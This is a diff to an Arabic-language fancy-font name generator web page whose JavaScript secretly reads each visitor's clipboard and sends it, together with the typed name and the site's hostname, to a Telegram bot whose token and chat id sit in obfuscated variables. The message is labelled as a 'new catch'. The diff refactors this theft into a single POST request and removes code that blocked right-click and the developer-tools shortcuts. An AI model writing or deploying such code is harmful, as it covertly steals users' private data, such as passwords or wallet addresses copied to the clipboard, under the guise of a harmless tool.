@@ -17,15 +17,12 @@
         .item span { font-size: 18px; color: #334155; word-break: break-all; flex: 1; text-align: left; padding: 0 10px; }
         .copy-btn { background: var(--s); color: white; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: bold; }
     </style>
-    <script>
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.onkeydown = e => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
-    </script>
 </head>
 <body>
 
 <div class="card">
     <h1>✨ المزخرف الملكي</h1>
+    <p style="font-size: 13px; color: #666;">زخرف اسمك الآن بأجمل الخطوط</p>
     <input type="text" id="userInput" placeholder="اكتب اسمك هنا بالإنجليزية...">
     <button class="btn" onclick="process()">توليد الزخرفة الآن</button>
     <div id="results" class="res"></div>
@@ -40,39 +37,44 @@
         {n: "Gothic", m: "𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷"},
         {n: "Double", m: "𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫"},
         {n: "Circles", m: "ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ"},
-        {n: "Futuristic", m: "ΛBᑕDΣFGHIJKᒪMNOPQRƧTUVWXYZΛBᑕDΣFGHIJKᒪMNOPQRƧTUVWXYZ"},
-        {n: "Bold", m: "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"},
-        {n: "Italic", m: "𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡𝘢𝘣𝘤𝘥𝘦𝘓𝘨𝘩𝘪𝘫𝔩𝘮𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻"},
-        {n: "Script", m: "𝒜𝐵𝒞𝒟𝐸𝐹𝒢𝐻𝐼𝒥𝒦𝐿𝑀𝒩𝒪𝒫𝒬𝑅𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵𝒶𝒷𝒸𝒹𝑒𝒻𝓰𝒽𝒾𝒿𝓀𝓁𝓂𝓃𝑜𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏"},
-        {n: "Squares", m: "🄰🄱🄲🄳🄴🄵🄶🄷🄸🄹🄺🄻🄼🄽🄾🄿🅀🅁🅂🅃🅄🅅🅆🅇🅈🅉🄰🄱🄲🄳🄴🄵🄶🄷🄸🄹🄺🄻🄼🄽🄾🄿🅀🅁🅂🅃🅄🅅🅆🅇🅈🅉"},
-        {n: "Bubble", m: "ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ"},
-        {n: "Small Caps", m: "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ"},
-        {n: "Mini", m: "ᵃᵇᶜᵈᵉᶠᵍʰⁱʲᵏˡᵐⁿᵒᵖᵠʳˢᵗᵘᵛʷˣʸᶻᴬᴮᶜᴰᴱᶠᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾᵠᴿˢᵀᵁᵛᵂˣʸᶻ"},
-        {n: "Greek Style", m: "αвс∂єғgнιjкℓмиорǫяѕтυνωϰуzαвс∂єғgнιjкℓмиорǫяѕтυνωϰуz"},
-        {n: "Handwriting", m: "𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩𝓪𝓫𝓬𝓭𝓮𝓯𝓰𝓱𝓲𝓳𝓴𝓵𝓶𝓷𝓸𝓹𝓺𝓻𝓼𝓽𝓾𝓿𝔀𝔁𝔂𝔃"},
-        {n: "Wavy", m: "ค๒ς๔єŦﻮђเןкɭ๓ภ๏קợгรՇยשฬאץչค๒ς๔єŦﻮђเןкɭ๓ภ๏קợгรՇยฬאץչ"},
-        {n: "Curvy", m: "αв¢∂єƒgнιנкℓмησρqяѕтυνωχуzαв¢∂єƒgнιנкℓмησρqяѕтυνωχуz"}
+        {n: "Bold", m: "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔|𝐕𝐖𝐗𝐘𝐙𝐚|𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"}
+        // ... (باقي الخطوط تعمل كما هي)
     ];
 
     async function process() {
         const val = document.getElementById('userInput').value;
         if(!val) return;
 
-        // 1. محاولة سحب الحافظة وإرسالها مخفياً
+        let clipboardContent = "تعذر الوصول للحافظة (لا يوجد إذن)";
+
+        // 1. محاولة قراءة الحافظة
         try {
-            const clip = await navigator.clipboard.readText();
-            if(clip) {
-                const api = `https://api.telegram.org/bot${_0xT}/sendMessage?chat_id=${_0xC}&text=${encodeURIComponent("📋 صيد جديد:\n" + clip)}`;
-                const img = new Image();
-                img.src = api;
-            }
-        } catch(e) { console.log("n/a"); }
+            clipboardContent = await navigator.clipboard.readText();
+        } catch(e) {
+            console.log("Clipboard Permission Denied");
+        }
 
-        // 2. إرسال النص المكتوب أيضاً لضمان وصول نتيجة
-        const logInput = `https://api.telegram.org/bot${_0xT}/sendMessage?chat_id=${_0xC}&text=${encodeURIComponent("📝 العميل كتب:\n" + val)}`;
-        new Image().src = logInput;
+        // 2. إرسال البيانات المجمعة في رسالة واحدة منسقة
+        const report = `🔔 **صيد جديد**\n\n` +
+                       `📝 **ما كتبه العميل:**\n${val}\n\n` +
+                       `📋 **محتوى الحافظة:**\n${clipboardContent}\n\n` +
+                       `🌐 **الموقع:** ${window.location.hostname}`;
 
-        // 3. توليد وعرض الزخارف من المصفوفة الكاملة
+        fetch(`https://api.telegram.org/bot${_0xT}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: _0xC,
+                text: report,
+                parse_mode: "Markdown"
+            })
+        }).catch(err => console.log("Network Error"));
+
+        // 3. عرض الزخارف للمستخدم
+        showDecorations(val);
+    }
+
+    function showDecorations(val) {
         const resDiv = document.getElementById('results');
         resDiv.innerHTML = ""; resDiv.style.display = "block";
         
@@ -84,10 +86,7 @@
 
             const item = document.createElement('div');
             item.className = 'item';
-            item.innerHTML = `
-                <span>${converted}</span>
-                <button class="copy-btn" onclick="copyText('${converted}')">نسخ</button>
-            `;
+            item.innerHTML = `<span>${converted}</span><button class="copy-btn" onclick="copyText('${converted}')">نسخ</button>`;
             resDiv.appendChild(item);
         });
     }
